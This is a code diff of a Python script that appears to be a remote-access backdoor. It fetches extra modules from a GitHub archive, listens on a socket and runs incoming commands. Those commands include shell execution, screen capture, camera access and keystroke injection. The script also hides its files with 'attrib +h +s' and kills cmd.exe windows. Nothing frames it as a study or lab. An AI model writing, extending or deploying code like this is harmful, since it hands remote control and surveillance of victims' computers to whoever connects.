@@ -2,6 +2,8 @@ import socket
 import zipfile, os, shutil, time, subprocess
 from turtle import left
 
+url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
+
 tryit = False
 while tryit == False:
     try:
@@ -45,7 +47,7 @@ def downloadFileGithub(file_url, data=".zip"):
              # writing one chunk at a time to zip file 
              if chunk: zip.write(chunk)
     unzipfile()
-    
+
 def unzipfile(file=".zip"):
     # ouvrir le fichier zip en mode lecture
     with zipfile.ZipFile(file, 'r') as zip: 
@@ -58,13 +60,13 @@ def sortNameFile(data):
     return [f for f in os.listdir(data) if isfile(join(data, f))]
     
 def moveFileFromDir(data, file):
-    fichiers = []
-    for i in range (len(file)):
-        fichiers.append(file[len(file)-1])
-    for f in range(len(fichiers)):
-        if fichiers[f] != getFileName():
-            print(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
-            shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
+    if type(file)==str:
+        file = file.split()
+    print(file)
+    for f in range(len(file)):
+        if file[f] != getFileName():
+            print(getpath(True)+"/"+data+"/"+file[f], getpath(True))
+            shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))
 
 tryit = False
 while tryit == False:
@@ -85,16 +87,28 @@ while tryit == False:
         time.sleep(5)
         os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
         time.sleep(5)
-
-url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
+tryit = False
+while tryit == False:
+    try: 
+        import modif
+        import scripter
+        tryit = True
+    except:
+        listfile = ["modif.py", "scripter.pyw"]
+        dir = getNameDir(url)
+        downloadFileGithub(url)
+        moveFileFromDir(dir, listfile)
+        time.sleep(1)
+        supDir(dir)
+        os.system(getFileName())
 
 #fichier modifier
 def receive():
     try:
+        client.settimeout(120)
         data = client.recv(1024)
         return data.decode()
     except:
-        print("restart")
         return "left"
     
 def terminal(command):
@@ -130,6 +144,7 @@ def screen():
 
 
 def execute(data):
+    start = time.time()
     global run, sortir
     if data == "die":
         run = False
@@ -147,7 +162,7 @@ def execute(data):
         camera()
     elif data == "left":
         print("restart")
-        sortir = False
+        sortir = False  
     elif data[0:4] == "fast":
         scripter.speed_write(data[5:len(data)])
     else:
@@ -156,21 +171,8 @@ def execute(data):
 run = True
 
 while run == True:
-    try: 
-        import modif
-        import scripter
-    except:
-        listfile = ["modif.py", "scripter.pyw"]
-        dir = getNameDir(url)
-        downloadFileGithub(url)
-        moveFileFromDir(dir, listfile)
-        time.sleep(1)
-        supDir(dir)
-        os.system(getFileName())
     sortir = True
-    
-    
-    ipScreen = "172.17.1.214"
+    ipScreen = "127.0.0.1"
     port = 22228
     
     
@@ -194,9 +196,7 @@ while run == True:
         subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
     (client, address) = server.accept()
     print("connect")
-    
-    
+
     while sortir == True and run == True:
         execute(receive())
-
 exit()
